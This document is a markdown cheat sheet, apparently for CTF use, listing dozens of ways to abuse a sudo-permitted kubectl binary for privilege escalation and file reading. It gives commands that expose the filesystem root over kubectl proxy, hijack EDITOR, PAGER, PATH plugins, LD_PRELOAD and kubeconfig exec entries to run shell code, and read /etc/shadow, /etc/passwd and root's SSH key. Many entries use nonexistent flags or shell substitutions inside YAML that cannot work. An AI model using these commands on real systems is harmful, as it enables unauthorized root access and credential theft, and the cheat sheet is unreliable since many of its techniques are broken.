
# 🏴‍☠️ Kubectl Privilege Escalation & File Abuse Compendium,  (..currently trash..)

A living “kubectl GTFOBins / CTF PrivEsc” cheat sheet.
Use with caution. In CTFs only. 😉

---

## 📑 Table of Contents

1. **File Serving Vectors**
2. **File Reading Techniques**
3. **Symlink Bypasses**
4. **Environment Variable Abuse**
5. **Configuration Exploitation**
6. **Output Format Abuse**
7. **File Discovery**
8. **Completion System Abuse**
9. **Error-Based Information Disclosure**
10. **Network Bypass**
11. **Common CTF File Locations**
12. **Debugging & Troubleshooting**
13. **Process Substitution & File Descriptors**
14. **Kubectl Internal Mechanisms**
15. **Resource Generator Abuse**
16. **Manifest Processing Beyond YAML**
17. **Output Redirection & Templating**
18. **Signal & Process Manipulation**
19. **Advanced Configuration Abuse**
20. **Plugin Architecture Exploitation**
21. **Resource Patching & Manipulation**
22. **Debugging & Development Features**
23. **Alternative Binary Invocation**
24. **File System Race Conditions**
25. **Memory & Cache Exploitation**
26. **Advanced Proxy Configurations**
27. **Edge Case Exploitations**
28. **Client-Side Parsers & Converters**
29. **Shell Escapes via Kubectl Subcommands**
30. **Compression & Encoding Tricks**
31. **Uncommon Output Formats**
32. **API Server Proxy Shenanigans**
33. **Log & Event Abuses**
34. **Build / Diff Weirdness**
35. **Aliasing & Binary Abuses**
36. **Exotic Inputs**
37. **Creative Error Side Channels**
38. **Pure WTF Escapes**
39. **Evil YAML Payload Arsenal**

---

## 1. File Serving Vectors

```bash
# Basic file server
sudo kubectl proxy --address=0.0.0.0 --port=PORT --www=PATH --www-prefix=/x/

# Bypass filters
sudo kubectl proxy --www=PATH --www-prefix=/x/ --disable-filter=true

# Serve filesystem root
sudo kubectl proxy --www=/ --www-prefix=/x/

# Access via wget
wget -qO- http://localhost:PORT/x/target/file
```

---

## 2. File Reading Techniques

```bash
# ConfigMap creation (dry-run)
sudo kubectl create configmap test --from-file=TARGET --dry-run=client -o yaml

# Secret creation 
sudo kubectl create secret generic test --from-file=TARGET --dry-run=client -o yaml

# Apply with validation
sudo kubectl apply --validate=false --dry-run=client -f TARGET

# File conversion
sudo kubectl convert -f TARGET
```

---

## 3. Symlink Bypasses

```bash
ln -sf /target/file /writable/location
ln -sf /target/directory /accessible/path
```

---

## 4. Environment Variable Abuse

```bash
# Editor hijacking
export EDITOR="id; vi"
sudo kubectl edit resource

# VISUAL
export VISUAL="payload; nano"

# Path manipulation for plugins
echo '#!/bin/sh\ncat /etc/passwd' > /tmp/kubectl-custom
chmod +x /tmp/kubectl-custom
PATH=/tmp:$PATH sudo kubectl custom
```

---

## 5. Configuration Exploitation

```yaml
# Malicious kubeconfig with exec
apiVersion: v1
kind: Config
users:
- name: user
  user:
    exec:
      command: /bin/sh
      args: ["-c","id"]
      apiVersion: client.authentication.k8s.io/v1beta1
```

```bash
sudo kubectl --kubeconfig=config.yaml version
```

---

## 6. Output Format Abuse

```bash
sudo kubectl get -o custom-columns-file=TARGET pods
sudo kubectl get --raw TARGET
sudo kubectl get -o go-template-file=TARGET resource
```

---

## 7. File Discovery

```bash
df
find /writable -type l
ls -la /accessible/

wget -qO- http://localhost:PORT/prefix/path/
```

---

## 8. Completion System Abuse

```bash
sudo kubectl completion bash > /tmp/comp
sudo kubectl plugin list
```

---

## 9. Error-Based Information Disclosure

```bash
echo 'apiVersion: /target/file' > invalid.yaml
sudo kubectl apply -f invalid.yaml

sudo kubectl create --validate=true -f TARGET
```

---

## 10. Network Bypass

```bash
sudo kubectl proxy --address=127.0.0.1 --port=PORT
sudo kubectl proxy --address=::1 --port=PORT
sudo kubectl proxy --unix-socket=/tmp/kubectl.sock --www=/target/dir
```

---

## 11. Common CTF File Locations

```
/flag*
/root/flag*
/home/user/flag*
/tmp/flag*
/var/tmp/flag*
/.flag*
/etc/flag*
```

---

## 12. Debugging & Troubleshooting

```bash
sudo kubectl version --client
sudo kubectl config view
sudo kubectl COMMAND --help
ps aux | grep kubectl
netstat -tlpn | grep kubectl
```

---

## 13. Process Substitution & File Descriptors

```bash
sudo kubectl apply -f <(cat /target/file)

exec 3< /target/file
sudo kubectl create -f /proc/self/fd/3

mkfifo /tmp/pipe
cat /target/file > /tmp/pipe &
sudo kubectl apply -f /tmp/pipe
```

---

## 14. Kubectl Internal Mechanisms

```bash
sudo kubectl --cache-dir=/target/dir get pods
sudo kubectl --kubeconfig=<(cat /target/file) version
sudo kubectl --token-file=/target/file version
sudo kubectl --client-certificate=/target/file version
```

---

## 15. Resource Generator Abuse

```bash
sudo kubectl create job test --image=busybox --dry-run=client --from-file=/target/file
sudo kubectl create deployment test --image=nginx --dry-run=client -o yaml | sed 's/nginx/$(cat \/target\/file)/'
sudo kubectl create sa test --dry-run=client -o yaml --token=/target/file
```

---

## 16. Manifest Processing Beyond YAML

```bash
# JSON
echo '{"apiVersion":"v1","data":' > /tmp/pre
cat /target/file >> /tmp/pre
echo '}' >> /tmp/pre
sudo kubectl apply -f /tmp/pre --dry-run=client

# Multi-doc
echo '---' > /tmp/multi
cat /target/file >> /tmp/multi
echo '---' >> /tmp/multi
sudo kubectl apply -f /tmp/multi --dry-run=client

# stdin
cat /target/file | sudo kubectl apply -f -
```

---

## 17. Output Redirection & Templating

```bash
sudo kubectl create cm test --from-literal=data='{{.}}' --dry-run=client -o go-template='{{.data}}' | bash

sudo kubectl version > /target/writable/location
sudo kubectl config view > /proc/self/fd/1
```

---

## 18. Signal & Process Manipulation

```bash
sudo kubectl proxy --www=/target/dir &
PID=$!
kill -STOP $PID
```

---

## 19. Advanced Configuration Abuse

```bash
echo "include: /target/file" > /tmp/config
sudo kubectl --kubeconfig=/tmp/config version

export KUBECONFIG=/target/file
sudo -E kubectl version

export XDG_CONFIG_HOME=/target/dir
sudo -E kubectl version
```

---

## 20. Plugin Architecture Exploitation

```bash
mkdir -p /tmp/kubectl-plugins
echo '#!/bin/sh\ncat /target/file' > /tmp/kubectl-plugins/kubectl-read
chmod +x /tmp/kubectl-plugins/kubectl-read
PATH=/tmp/kubectl-plugins:$PATH sudo kubectl read
```

---

## 21. Resource Patching & Manipulation

```bash
echo '{"data":{"file":"' > /tmp/patch
base64 /target/file >> /tmp/patch
echo '"}}' >> /tmp/patch
sudo kubectl patch cm test --patch-file=/tmp/patch --dry-run=client

sudo kubectl patch cm test --type='json' -p="[{'op':'add','path':'/data/file','value':'$(cat /target/file)'}]" --dry-run=client
```

---

## 22. Debugging & Development Features

```bash
sudo kubectl debug --share-processes=true --image=busybox node/target
sudo kubectl alpha debug --stdin --tty /target/file
sudo kubectl explain --include-extended-apis=true $(cat /target/file)
```

---

## 23. Alternative Binary Invocation

```bash
ln -s $(which kubectl) /tmp/k
sudo /tmp/k proxy --www=/target/dir

sudo exec kubectl proxy --www=/target/dir

sudo -u root sh -c 'exec -a modified_kubectl kubectl proxy --www=/target/dir'
```

---

## 24. File System Race Conditions

```bash
while true; do ln -sf /target/file /tmp/race 2>/dev/null && break; done &
sudo kubectl apply -f /tmp/race &
```

---

## 25. Memory & Cache Exploitation

```bash
sudo kubectl --cache-dir=/tmp/evil get pods
sudo kubectl diff -f <(cat /target/file; echo "---"; kubectl get cm test -o yaml)
sudo kubectl apply --server-dry-run -f /target/file
```

---

## 26. Advanced Proxy Configurations

```bash
sudo kubectl proxy --www=/target1 --www-prefix=/a/ --port=8001 &
sudo kubectl proxy --www=/target2 --www-prefix=/b/ --port=8002 &

sudo kubectl proxy --www=/target/dir --api-prefix=/api/ --www-prefix=/static/
```

---

## 27. Edge Case Exploitations

```bash
echo "corrupted" > /tmp/bad
export KUBECONFIG=/tmp/bad:/target/file
sudo -E kubectl version

ln -s /target/file /tmp/a
ln -s /tmp/a /tmp/b
sudo kubectl apply -f /tmp/b

sudo kubectl apply -f /dev/stdin < /target/file
```

---

## 28. Client-Side Parsers & Converters

```bash
sudo kubectl kustomize /target/dir
sudo kubectl apply -f /target/file --openapi-schema-validation
```

---

## 29. Shell Escapes via Kubectl Subcommands

```bash
EDITOR="sh -c id" sudo kubectl edit cm test
PAGER="less -! -f /target/file" sudo kubectl get pods
sudo kubectl run evil --image=busybox -it -- sh
```

---

## 30. Compression & Encoding Tricks

```bash
sudo kubectl create cm test --from-file=/target/file -o yaml | grep base64
tar -cf /tmp/bundle.tar /target/file
sudo kubectl apply -f /tmp/bundle.tar
```

---

## 31. Uncommon Output Formats

```bash
sudo kubectl get pods -o wide
sudo kubectl get pods -o jsonpath='{.items[?(@.metadata.name=="$(cat /target/file)")]}'
sudo kubectl get -o=custom-columns=NAME:.metadata.name,FILE:$(cat /target/file)
```

---

## 32. API Server Proxy Shenanigans

```bash
sudo kubectl proxy --www=/target/dir --api-prefix=/alt/api/
sudo kubectl proxy --port=10250 &
wget -qO- http://127.0.0.1:10250/pods
```

---

## 33. Log & Event Abuses

```bash
kubectl create cm test --from-file=/target/file
kubectl describe cm test | grep target
```

---

## 34. Build / Diff Weirdness

```bash
sudo kubectl diff -f /target/file
sudo kubectl patch pod test -p "$(cat /target/file)"
```

---

## 35. Aliasing & Binary Abuses

```bash
ln -s $(which kubectl) /tmp/kube
sudo /tmp/kube apply -f /target/file

LD_PRELOAD=/tmp/evil.so sudo kubectl version
```

---

## 36. Exotic Inputs

```bash
sudo kubectl apply -f /dev/stdin < /target/file
sudo kubectl create -f /dev/fd/3 3</target/file
```

---

## 37. Creative Error Side Channels

```bash
echo 'apiVersion: v1
kind: $(cat /target/file)' > evil.yaml
sudo kubectl apply -f evil.yaml

sudo kubectl explain $(cat /target/file)
```

---

## 38. Pure WTF Escapes

```bash
sudo kubectl proxy --port=8080 &
wget -qO- http://127.0.0.1:8080/debug/pprof/cmdline

sudo kubectl completion zsh | grep /target/file
```

---

## 39. Evil YAML Payload Arsenal

### Inject File Contents into Metadata

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-$(cat /etc/shadow)
spec:
  containers:
  - name: c
    image: busybox
    command: ["sleep", "infinity"]
```

### Abuse Invalid API Versions

```yaml
apiVersion: $(cat /root/flag)
kind: Pod
metadata:
  name: evilpod
```

### Resource Name Injection

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: $(cat /root/.ssh/id_rsa)
data:
  a: b
```

### Multi-Doc Manifest

```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: evil
data:
  secret: |
    $(cat /target/file)
---
apiVersion: v1
kind: Pod
metadata:
  name: foo
```

### Go-Template Payload in Output

```bash
sudo kubectl create cm pwn --from-literal=data='{{.}}' \
  --dry-run=client -o go-template='{{.data}}' | bash
```

### JSON Patch Abuse

```bash
sudo kubectl patch cm test --type='json' \
  -p="[{'op':'add','path':'/data/loot','value':'$(cat /etc/passwd)'}]" --dry-run=client
```

